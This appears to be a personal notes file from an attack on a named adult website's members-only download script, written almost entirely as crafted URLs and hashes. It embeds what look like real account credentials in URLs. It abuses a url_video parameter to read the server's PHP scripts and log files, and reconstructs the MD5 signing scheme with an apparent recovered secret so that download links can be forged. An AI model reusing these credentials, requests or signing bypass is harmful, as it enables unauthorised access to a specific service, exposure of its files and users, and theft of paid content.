# Notes on how to access URLs

# Tricks??
http://cbaier:kn1pers@ddgirls.com/members/scripts/dvd/master/find.php?url_video=/members/scripts/dvd/master/find.php
http://cbaier:kn1pers@ddgirls.com/members/scripts/dvd/master/find.php?url_video=/scripts/dvd/slave/download.php

## Redirects

http://ddgirls.com/members/scripts/dvd/master/find.php?url_video=/members/scripts/dvd/master/find.php
http://ddg3.ddgirls.com/scripts/dvd/slave/download.php?username=cbaier&timestamp=1142931241&site=ddgirls&user_downloads=1&auth=2152f5826de9bd0d0b6b1490cac664c0&url_video=%2Fmembers%2Fscripts%2Fdvd%2Fmaster%2Ffind.php

## Log files

/logs/sites/ddgirls.com/dvd/master/2006_03/20/master
/logs/sites/ddgirls.com/dvd/master/2006_03/20/USERNAME

## Requests

http://ddg3.ddgirls.com/scripts/dvd/slave/download.php?username=clover&timestamp=1142931241&site=ddgirls&user_downloads=1&auth=d3e70e7a4370d1d9d44a978343e2e270&url_video=%2Fmembers%2Fscripts%2Fdvd%2Fmaster%2Ffind.php
  $md5 = md5($username . $timestamp . $site . $url_video . $downloads . $conf['secret']);
'd9453a75555fd89a12dba80ccadae906'

http://ddg3.ddgirls.com/scripts/dvd/slave/download.php?username=clover&timestamp=1142996548&site=ddgirls&user_downloads=1&auth=2152f5826de9bd0d0b6b1490cac664c0&url_video=%2Flogs%2Fsites%2Fddgirls.com%2Fdvd%2Fmaster%2F2006_03%2F21%2Fmaster
md5(): clover1142996548ddgirls%2Flogs%2Fsites%2Fddgirls.com%2Fdvd%2Fmaster%2F2006_03%2F21%2Fmaster1d9453a75555fd89a12dba80ccadae906

d3e70e7a4370d1d9d44a978343e2e270

/web/sites/ddgirls.com/public_html/scripts/dvd/slave/download.php

## server responses saved to /master and /slave folders
